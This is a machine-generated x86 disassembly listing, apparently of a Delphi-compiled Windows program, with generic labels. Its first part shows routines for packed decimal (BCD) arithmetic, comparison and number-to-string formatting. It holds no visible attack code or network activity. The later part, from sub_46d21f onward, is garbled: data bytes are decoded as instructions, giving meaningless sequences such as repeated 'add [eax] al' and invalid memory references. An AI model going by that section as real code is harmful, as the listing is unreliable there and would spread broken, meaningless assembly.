test [ esi + 0x1 ] 0x80
jne r-xdata
mov [ ebp - 0x3 ] 0x0
jmp r-xdata
movsx eax ax
cmp eax 0x1f
jg r-xdata
inc eax
mov al [ esi + 0x1 ]
call sub_46c1c8
mov [ esi + 0x1 ] al
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebx + eax ] 0x0
inc eax
cmp eax 0x20
jne r-xdata
sub_46c340
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
mov al [ esi ]
xor edx edx
mov dl al
cmp edi edx
jl r-xdata
mov [ ebx ] al
mov al [ esi + 0x1 ]
mov [ ebx + 0x1 ] al
lea ebp [ ebx + 0x2 ]
mov eax ebp
xor ecx ecx
mov edx 0x20
call sub_402c58
lea eax [ esi + 0x2 ]
mov esi eax
jmp r-xdata
mov edi ebx
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
jmp r-xdata
xor eax eax
mov al [ ebx ]
cmp edi eax
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_46ce08
movzx eax ax
xor edx edx
mov dl [ ebx ]
add eax edx
add eax 0x2
shr eax 0x1
cmp eax 0x20
jle r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edx ebp
mov ecx esi
xchg ecx eax
call sub_4029b0
mov eax 0x20
sub [ ebx ] 0x2
inc esi
sub_46c3c0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x26 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ebx edx
mov edi ebx
lea esi [ ebp - 0x26 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
mov al [ ebp - 0x26 ]
and eax 0x1
test eax eax
je r-xdata
lea eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov al [ ebx ]
shr eax 0x1
cmp eax 0x1f
jg r-xdata
lea eax [ ebp - 0x24 ]
lea edx [ ebx + 0x2 ]
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx ] 0x0
mov dl [ ebp - 0x26 ]
inc edx
mov [ ebx ] dl
lea edx [ ebp - 0x4 ]
mov cl [ ebp - 0x26 ]
xchg edx eax
call sub_46c1d4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov [ edx + eax ] 0x0
inc eax
cmp eax 0x20
jne r-xdata
sub_46c43c
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
lea edx [ ebp - 0x26 ]
mov eax ebx
call sub_46c3c0
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_46c3c0
cmp [ ebp - 0x26 ] 0x20
ja r-xdata
mov eax esi
call sub_46c324
push eax
mov eax ebx
call sub_46c324
pop edx
call sub_42a4e0
mov ebx eax
xor eax eax
mov al [ ebp - 0x26 ]
cmp bx ax
jae r-xdata
cmp [ ebp - 0x48 ] 0x20
jbe r-xdata
xor eax eax
mov al [ ebp - 0x48 ]
cmp bx ax
jae r-xdata
mov ebx eax
xor edx edx
mov dl [ ebp - 0x48 ]
xor eax eax
mov al [ ebp - 0x26 ]
call sub_42a4e0
mov ebx eax
lea eax [ ebp - 0x48 ]
call sub_46ce08
movzx eax ax
push eax
lea eax [ ebp - 0x26 ]
call sub_46ce08
movzx eax ax
pop edx
call sub_42a4e0
mov esi eax
jmp r-xdata
lea ecx [ ebp - 0x6c ]
movzx esi bx
mov edx esi
lea eax [ ebp - 0x26 ]
call sub_46c340
push esi
lea esi [ ebp - 0x6c ]
lea edi [ ebp - 0x26 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x6c ]
mov edx esi
lea eax [ ebp - 0x48 ]
call sub_46c340
lea esi [ ebp - 0x6c ]
lea edi [ ebp - 0x48 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ebx eax
cmp bx 0x40
jae r-xdata
push esi
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x26 ]
mov ecx ebx
call sub_46c214
push esi
mov edx [ ebp + 0xc ]
lea eax [ ebp - 0x48 ]
mov ecx ebx
call sub_46c214
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x26 ]
call sub_46ce08
movzx eax ax
xor edx edx
mov dl [ ebp - 0x26 ]
sub edx eax
movzx edi bx
movzx eax si
sub edi eax
cmp edx edi
jg r-xdata
add bx 0x2
lea eax [ ebp - 0x48 ]
call sub_46ce08
movzx eax ax
xor edx edx
mov dl [ ebp - 0x48 ]
sub edx eax
cmp edi edx
jl r-xdata
sub_46c570
push ebx
push esi
push edi
push ebp
add esp 0xffffffb8
mov esi edx
mov edi eax
mov al [ edi + 0x1 ]
and al 0x80
mov dl [ esi + 0x1 ]
and dl 0x80
cmp al dl
je r-xdata
test al al
setne [ esp + 0x1 ]
lea ebp [ edi + 0x2 ]
lea ebx [ esi + 0x2 ]
push ebp
mov al [ edi + 0x1 ]
and al 0x3f
and eax 0xff
xor edx edx
mov dl [ edi ]
sub dx ax
push edx
call sub_46bf6c
mov [ esp ] al
push ebx
mov al [ esi + 0x1 ]
and al 0x3f
and eax 0xff
xor edx edx
mov dl [ esi ]
sub dx ax
push edx
call sub_46bf6c
cmp al [ esp ]
je r-xdata
test al al
je r-xdata
lea eax [ esp + 0x24 ]
push eax
push 0x0
lea ecx [ esp + 0xa ]
mov edx esi
mov eax edi
call sub_46c43c
lea ebp [ esp + 0x4 ]
lea ebx [ esp + 0x26 ]
push ebp
push ebx
xor eax eax
mov al [ esp + 0xa ]
push eax
xor eax eax
mov al [ esp + 0x30 ]
push eax
call sub_46c120
cmp al [ esp ]
jge r-xdata
mov eax 0x1
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
add esp 0x48
pop ebp
pop edi
pop esi
pop ebx
retn
neg eax
or eax 0xffffffff
jmp r-xdata
mov eax 0x1
jmp r-xdata
cmp [ esp + 0x1 ] 0x0
je r-xdata
sub_46c638
push ebx
push esi
push edi
add esp 0xffffffdc
mov esi ecx
mov ebx eax
push esi
mov esi edx
lea edi [ esp + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
mov al [ esp + 0x1 ]
call sub_46c1c8
mov [ esp + 0x1 ] al
mov ecx esi
mov edx esp
mov eax ebx
call sub_46c994
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_46c674
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40444c
mov eax [ ebp - 0x8 ]
call sub_40444c
xor eax eax
push ebp
push sub_46c75d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_40445c
cmp [ eax ] 0x2d
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40445c
cmp [ eax ] 0x2d
jne r-xdata
inc ebx
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40425c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4044bc
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46b364
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
call sub_46a4f4
push esi
mov edi esi
lea esi [ ebp - 0x30 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
and ebx 0x80000001
jns r-xdata
inc ebx
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40425c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_4044bc
test ebx ebx
je r-xdata
dec ebx
or ebx 0xfffffffe
inc ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c764
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403fc0
retn
mov al [ esi + 0x1 ]
and al 0x3f
or al 0x80
mov [ esi + 0x1 ] al
sub_46c76c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46c7c8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46ccc4
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_46ccc4
mov eax [ ebp - 0x8 ]
mov ecx edi
pop edx
call sub_46c674
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c7cf
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
sub_46c7d8
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40444c
mov eax [ ebp - 0x8 ]
call sub_40444c
xor eax eax
push ebp
push sub_46c90e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043a8
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405eac
mov eax [ ebp - 0x10 ]
call sub_469cb0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_40445c
cmp [ eax ] 0x2d
jne r-xdata
mov bl 0xa
xor edi edi
mov bl [ esi + 0x1 ]
and bl 0x3f
test bl bl
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40445c
cmp [ eax ] 0x2d
jne r-xdata
inc edi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40425c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4044bc
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46ba44
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0xc ]
xor edx edx
mov dl bl
call sub_46a5a8
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0xc ]
call sub_46a4f4
push esi
push edi
mov edi esi
lea esi [ ebp - 0x38 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop edi
pop esi
and edi 0x80000001
jns r-xdata
inc edi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40425c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_4044bc
test edi edi
je r-xdata
dec edi
or edi 0xfffffffe
inc edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c915
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_403fc0
retn
mov al [ esi + 0x1 ]
and al 0x3f
or al 0x80
mov [ esi + 0x1 ] al
sub_46c928
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46c984
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46ccc4
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_46ccc4
mov eax [ ebp - 0x8 ]
mov ecx edi
pop edx
call sub_46c7d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c98b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
sub_46c994
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov esi ecx
mov [ esp ] edx
mov ebx eax
lea eax [ esp + 0x2f ]
push eax
push 0x1
lea ecx [ esp + 0x15 ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_46c43c
movzx ebp [ esp + 0xd ]
movzx edi [ esp + 0xe ]
test [ ebx + 0x1 ] 0x80
setne al
mov ebx eax
mov eax [ esp ]
test [ eax + 0x1 ] 0x80
setne [ esp + 0xc ]
mov eax ebp
mov [ esi ] al
cmp bl [ esp + 0xc ]
je r-xdata
mov eax edi
mov [ esi + 0x1 ] al
jmp r-xdata
mov al [ esp + 0xe ]
and al 0x3f
mov dl [ esp + 0x30 ]
and dl 0x3f
cmp al dl
jb r-xdata
lea eax [ esp + 0xf ]
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x31 ]
mov [ esp + 0x8 ] eax
lea edi [ esi + 0x2 ]
mov eax edi
xor ecx ecx
mov edx 0x20
call sub_402c58
cmp bl [ esp + 0xc ]
jne r-xdata
mov eax edi
call sub_46c1c8
mov [ esi + 0x1 ] al
mov eax [ esp + 0x4 ]
push eax
push ebp
call sub_46bf6c
movzx ebx ax
mov eax [ esp + 0x8 ]
push eax
push ebp
call sub_46bf6c
movzx eax ax
cmp eax ebx
jge r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push edi
push ebp
call sub_46c068
jmp r-xdata
cmp ebx eax
jge r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push edi
push ebp
call sub_46bfb0
jmp r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push ebp
push ebp
call sub_46c120
test eax eax
jl r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push edi
push ebp
call sub_46bfb0
mov al [ esi + 0x1 ]
call sub_46c1c8
mov [ esi + 0x1 ] al
jmp r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push edi
push ebp
call sub_46bfb0
mov al [ esi + 0x1 ]
call sub_46c1c8
mov [ esi + 0x1 ] al
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push edi
push ebp
call sub_46bfb0
jmp r-xdata
sub_46cb00
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
movsx edx [ edx - 0x9 ]
cmp eax edx
je r-xdata
test bl bl
ja r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebx + 0x30 ]
call sub_46cae4
pop ecx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x11 ]
call sub_46cae4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov al 0x30
call sub_46cae4
pop ecx
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
pop ebx
pop ebp
retn
sub_46cb7c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x14 ] dx
mov edi eax
movsx eax [ ebp - 0x14 ]
add eax 0x3
call sub_407ee0
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_46cc6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor ebx ebx
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
movsx esi [ ebp - 0x14 ]
cmp esi [ ebp - 0x10 ]
jg r-xdata
push ebp
xor eax eax
mov al [ edi + ebx ]
shr eax 0x4
call sub_46cb00
pop ecx
cmp esi [ ebp - 0x10 ]
jle r-xdata
jmp r-xdata
inc ebx
push ebp
mov al [ edi + ebx ]
and al 0xf
call sub_46cb00
pop ecx
cmp [ ebp - 0x9 ] 0x0
jle r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx - 0x1 ]
cmp al [ ebp - 0x11 ]
jne r-xdata
movsx eax [ ebp - 0x9 ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax + edx ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cc72
movsx edx [ ebp - 0x14 ]
add edx 0x2
mov eax [ ebp - 0x18 ]
call sub_4027d4
retn
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x1
jg r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x30
jne r-xdata
dec [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax + edx ] 0x0
sub_46cc72
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_403ff0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_4042a8
sub_46ccc4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46cdc3
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx ]
test al al
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405eac
mov eax [ ebp - 0x10 ]
call sub_469cc8
jmp r-xdata
cmp al 0x40
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cdca
lea eax [ ebp - 0x10 ]
call sub_403f9c
retn
mov dl [ ebx + 0x1 ]
test dl 0x80
setne [ ebp - 0x9 ]
mov esi eax
and esi 0xff
lea eax [ ebx + 0x2 ]
mov [ ebp - 0x8 ] eax
and dl 0x3f
test dl dl
jbe r-xdata
mov edi esi
inc edi
mov eax esi
mov dl [ ebx + 0x1 ]
and dl 0x3f
sub al dl
movsx edi al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx r-xdata
call sub_4043a8
je r-xdata
sub al 0x3
jne r-xdata
mov al [ ebp - 0x9 ]
push eax
mov al [ ebx + 0x1 ]
and al 0x3f
and eax 0xff
cmp esi eax
sete al
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_46cb7c
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x2d
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403ff0
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx r-xdata
call sub_4043a8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx r-xdata
call sub_4043a8
jne r-xdata
sub_46ce14
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi eax
xchg edx ecx
mov [ esi ] cl
mov [ esi + 0x1 ] dl
sub edx 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
or ebx ebx
jns r-xdata
ja r-xdata
mov edi 0xa
neg ebx
neg eax
sbb ebx 0x0
or [ esi + 0x1 ] 0x80
dec ecx
mov [ ecx + ebp - 0x40 ] 0x0
dec edx
jne r-xdata
fild [ ebp + 0x8 ]
fdiv [ edx * 4 + rw-data ]
fistp [ ebp + 0x8 ]
jmp r-xdata
mov [ ecx + ebp - 0x41 ] dl
dec ecx
jne r-xdata
xor edx edx
or ebx ebx
je r-xdata
mov edx eax
or edx ebx
je r-xdata
or eax ebx
mov al 0x0
jne r-xdata
div edi
xchg ebx eax
div edi
xchg ebx eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov cl [ esi ]
inc ecx
shr ecx 0x1
mov ax [ ebp + ecx * 2 - 0x42 ]
shl al 0x4
or al ah
mov [ esi + ecx + 0x1 ] al
dec ecx
jne r-xdata
mov al 0x1
sub_46cea0
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push edi
push esi
xor ebx ebx
mov edi eax
mov esi edx
mov al 0x0
movzx edx [ edi ]
or edx edx
je r-xdata
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x1 ]
shr ecx 0x1
mov al [ edi + ecx + 0x1 ]
mov ah al
shr al 0x4
and ah 0xf
mov [ ebp + ecx * 2 - 0x42 ] ax
dec ecx
jne r-xdata
xor eax eax
mov [ ebp - 0x44 ] eax
fild [ ebp - 0x44 ]
inc ecx
cmp ecx edx
jne r-xdata
mov al [ edi + 0x1 ]
or al al
jns r-xdata
fmul [ ebx + rw-data ]
mov al [ ecx + ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
fiadd [ ebp - 0x44 ]
jmp r-xdata
mov al [ ecx + ebp - 0x40 ]
or al al
jne r-xdata
fldz
jmp r-xdata
and eax 0x3f
sub eax 0x4
neg eax
call j_sub_402d98
fchs
inc ecx
cmp ecx edx
je r-xdata
fwait
fnstcw [ ebp - 0x46 ]
fldcw [ ebx + rw-data ]
fistp [ esi ]
fwait
fnstsw ax
not al
and al 0x1
fwait
fnclex
fldcw [ ebp - 0x46 ]
fwait
sub_46cf38
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46cf69
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cf70
retn
mov eax rw-data
call sub_40d420
sub_46d21f
dec [ ebx ]
add [ eax ] al
add [ esi + 0x4d ] al
push esp
inc edx
arpl [ esi + eax * 2 + 0x69 ] sp
insb
add [ fs : edx + edx * 8 ] dh
inc esi
add [ edi ] cl
or cl [ ecx + 0x44 ]
inc edx
push ebx
jae r-xdata
add al 0xe8
jmp sub_405aa0
imul ebp [ edi + 0x6e ] r-xdata
add ebx edi
dec eax
and al 0xcc
jb r-xdata
add [ eax ] al
add bh bh
mov [ 0x77f7934b ] al

sub_46d25b
dec esp
add eax 0xffffffec
jmp r-xdata
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_403ff0
pop esi
pop ebx
retn
sub_46d2c4
inc esi
add [ edi - 0x2e ] bh
inc esi
add [ ecx + 0x5d0046d2 ] cl
rol [ esi ] cl
rol [ gs : esi ] cl
insd
rol [ esi ] cl
mov [ 0xffffffffad0046d2 ] eax
rol [ esi ] cl
mov bh 0xd2
inc esi
add [ ebx - 0x64ffb92e ] dl
rol [ esi ] cl
add al [ eax ]
add [ eax ] al
jbe r-xdata
rol [ esi ] cl
mov al [ 0xffffffffaaec6afa ]
dec eax
xchg edi eax
push esp
sub eax 0x5c81df36
or eax r-xdata
adc al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ch al
mov eax [ 0xffffffffcd6adc29 ]
inc esp
mov dh bl
dec edi
push ecx
mov dl 0x5d
pop ecx
xchg ebp eax
fcmovbe st2
inc esi
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x46d378c0 ] cl
add dh ch
rol [ esi ] cl
add [ eax ] al
add [ eax ] al
js r-xdata
add [ eax ] cl
lds esp [ ecx - 0x329523d7 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x1c0046d3 ] cl
add [ eax ] al
add [ edx + edx + 0x40 ] dl
add [ esp + esi + 0x5a4c0040 ] dl
inc eax
add [ eax + 0x5a ] bl
inc eax
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax + 0x5a ] ch
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
sbb edx [ esp + eax * 2 + 0x65 ]
popa
jne r-xdata
je r-xdata
pop esi
pop ebx
retn
inc edx
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ecx
jo r-xdata
mov ecx 0x26
mov edx [ r-xdata ]
call sub_404a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d433
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
mov eax eax
mov al [ eax + 0xc ]
retn
sub_46d438
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46d499
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d4a0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
mov ecx r-xdata
call sub_405a10
mov eax rw-data
mov edx [ rw-data ]
mov ecx r-xdata
call sub_405a10
sub edx 0xfffffff8
sub_46d4fc
push 0xe70047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add al ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add cl ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dl ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bl ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ah ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ch ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dh ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bh ch
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add al dl
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add cl dl
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46d579
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d580
retn
sub_46d58c
fcom st5
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 8 - 0x2933ffba ] ch
inc esi
add [ ecx - 0x29 ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ edx + 0x240046d7 ] al
add eax [ eax ]
add al ah
pop ebx
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax - 0x6d ] dh
inc ebp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax + 0x64 ]
xchg ebp eax
inc ebp
add [ eax ] dh
xchg esp eax
inc ebp
add [ eax + 0x4 ] bl
inc esp
add ah bl
xchg ebp eax
inc ebp
add [ edi + ecx * 4 - 0x5823ffbb ] cl
inc ecx
add ah bl
mov eax [ ebp ]
sbb [ ebp + eax * 2 + 0x458d2400 ] cl
add [ ecx + eax + 0x3600044 ] ch
inc edx
add [ ebp + edx * 4 + r--data ] bl
inc edx
add [ ecx + edx * 8 ] bh
inc ebp
add [ esi + eax * 4 + 0x45 ] dh
add [ eax ] dl
jb r-xdata
outsb
insb
cld
add al [ eax ]
add [ ecx ] al
add [ 0x65766542 ] al
insb
add [ ebx ] al
add [ eax ] al
add al [ eax ]
or al 0x44
popad
je r-xdata
add [ eax + ebp * 2 ] bh
inc esp
add ah ah
leave
inc ebp
add [ eax + 0x7f ] ch
inc ebp
add [ eax ] bl
add [ ebp ] 0xc4
mov edx 0x8b000045
inc ebp
add [ ebx + ecx * 4 + 0x45 ] bh
add ah al
int 0x45
add [ eax ] bh
mov [ ebp ] al
enter 0x45c8 0x0
test al 0xaf
inc ebp
add [ edx + ecx * 8 + 0x45 ] bh
add [ eax - 0x6b ] ah
inc ebp
add [ ebx ] cl
add [ edi - 0x7ffb929 ] cl
add al [ eax ]
add [ eax ] al
add [ 0x656e6150 ] al
insb
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax + eax ] al
bound esp [ ecx + 0x73 ]
dec esi
popad
insd
add al 0x3
add [ eax ] al
add eax [ eax ]
or [ edi + 0x4b ] cl
inc edx
jne r-xdata
and al 0x3
add [ eax ] al
loopne r-xdata
inc ebp
